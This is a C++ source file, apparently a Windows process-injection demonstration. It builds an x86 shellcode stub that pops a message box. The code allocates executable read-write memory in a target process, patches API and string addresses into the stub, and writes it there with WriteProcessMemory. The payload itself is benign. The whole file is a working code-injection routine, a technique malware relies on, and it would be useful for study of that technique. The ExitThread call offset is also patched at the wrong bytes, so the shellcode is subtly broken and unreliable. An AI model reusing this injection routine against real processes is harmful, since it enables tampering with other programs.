#include "payload.h"
#include <iostream>

namespace Payload {

    PayloadData GetDefaultPayload() {
        static unsigned char code[] = {
            0x6A, 0x00,                        
            0x68, 0x00, 0x00, 0x00, 0x00,       
            0x68, 0x00, 0x00, 0x00, 0x00,      
            0x6A, 0x00,                         
            0xE8, 0x00, 0x00, 0x00, 0x00,      
            0x6A, 0x00,                         
            0xE8, 0x00, 0x00, 0x00, 0x00,       
            0x90, 0x90, 0x90, 0x90            
        };

        PayloadData data = {
            code,
            sizeof(code),
            "Hello (injected from the code)",
            "Remote Injection"
        };

        return data;
    }

    BOOL InjectPayload(HANDLE hProcess, const PayloadData& payload, LPVOID* remoteBuffer) {
        SIZE_T totalSize = payload.codeSize + strlen(payload.message) + 1 + strlen(payload.title) + 1;
        *remoteBuffer = VirtualAllocEx(hProcess, NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (*remoteBuffer == NULL) {
            std::cerr << "Failed to allocate memory in remote process: " << GetLastError() << std::endl;
            return FALSE;
        }

        unsigned char* payloadCopy = new unsigned char[payload.codeSize];
        memcpy(payloadCopy, payload.code, payload.codeSize);

        LPVOID remoteMessage = (LPVOID)((LPBYTE)*remoteBuffer + payload.codeSize);
        LPVOID remoteTitle = (LPVOID)((LPBYTE)remoteMessage + strlen(payload.message) + 1);

        *(DWORD*)(payloadCopy + 3) = (DWORD)remoteTitle;
        *(DWORD*)(payloadCopy + 8) = (DWORD)remoteMessage;

        HMODULE hUser32 = GetModuleHandleA("user32.dll");
        if (!hUser32) {
            hUser32 = LoadLibraryA("user32.dll");
            if (!hUser32) {
                std::cerr << "Failed to get/load user32.dll: " << GetLastError() << std::endl;
                VirtualFreeEx(hProcess, *remoteBuffer, 0, MEM_RELEASE);
                delete[] payloadCopy;
                return FALSE;
            }
        }

        FARPROC messageBoxAddr = GetProcAddress(hUser32, "MessageBoxA");
        if (!messageBoxAddr) {
            std::cerr << "Failed to get MessageBoxA address: " << GetLastError() << std::endl;
            if (hUser32 != GetModuleHandleA("user32.dll")) {
                FreeLibrary(hUser32);
            }
            VirtualFreeEx(hProcess, *remoteBuffer, 0, MEM_RELEASE);
            delete[] payloadCopy;
            return FALSE;
        }

        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        if (!hKernel32) {
            hKernel32 = LoadLibraryA("kernel32.dll");
            if (!hKernel32) {
                std::cerr << "Failed to get/load kernel32.dll: " << GetLastError() << std::endl;
                if (hUser32 != GetModuleHandleA("user32.dll")) {
                    FreeLibrary(hUser32);
                }
                VirtualFreeEx(hProcess, *remoteBuffer, 0, MEM_RELEASE);
                delete[] payloadCopy;
                return FALSE;
            }
        }

        FARPROC exitThreadAddr = GetProcAddress(hKernel32, "ExitThread");
        if (!exitThreadAddr) {
            std::cerr << "Failed to get ExitThread address: " << GetLastError() << std::endl;
            if (hUser32 != GetModuleHandleA("user32.dll")) {
                FreeLibrary(hUser32);
            }
            if (hKernel32 != GetModuleHandleA("kernel32.dll")) {
                FreeLibrary(hKernel32);
            }
            VirtualFreeEx(hProcess, *remoteBuffer, 0, MEM_RELEASE);
            delete[] payloadCopy;
            return FALSE;
        }

        DWORD callOffset = (DWORD)messageBoxAddr - (DWORD)((LPBYTE)*remoteBuffer + 18);
        *(DWORD*)(payloadCopy + 14) = callOffset;
        DWORD exitThreadOffset = (DWORD)exitThreadAddr - (DWORD)((LPBYTE)*remoteBuffer + 24);
        *(DWORD*)(payloadCopy + 20) = exitThreadOffset;

        SIZE_T bytesWritten;
        if (!WriteProcessMemory(hProcess, *remoteBuffer, payloadCopy, payload.codeSize, &bytesWritten) || bytesWritten != payload.codeSize) {
            std::cerr << "Failed to write payload: " << GetLastError() << ", Bytes written: " << bytesWritten << std::endl;
            VirtualFreeEx(hProcess, *remoteBuffer, 0, MEM_RELEASE);
            delete[] payloadCopy;
            return FALSE;
        }

        if (!WriteProcessMemory(hProcess, remoteMessage, payload.message, strlen(payload.message) + 1, &bytesWritten) || bytesWritten != strlen(payload.message) + 1) {
            std::cerr << "Failed to write message: " << GetLastError() << ", Bytes written: " << bytesWritten << std::endl;
            VirtualFreeEx(hProcess, *remoteBuffer, 0, MEM_RELEASE);
            delete[] payloadCopy;
            return FALSE;
        }

        if (!WriteProcessMemory(hProcess, remoteTitle, payload.title, strlen(payload.title) + 1, &bytesWritten) || bytesWritten != strlen(payload.title) + 1) {
            std::cerr << "Failed to write title: " << GetLastError() << ", Bytes written: " << bytesWritten << std::endl;
            VirtualFreeEx(hProcess, *remoteBuffer, 0, MEM_RELEASE);
            delete[] payloadCopy;
            return FALSE;
        }

        delete[] payloadCopy;
        if (hUser32 != GetModuleHandleA("user32.dll")) {
            FreeLibrary(hUser32);
        }
        if (hKernel32 != GetModuleHandleA("kernel32.dll")) {
            FreeLibrary(hKernel32);
        }
        return TRUE;
    }

} 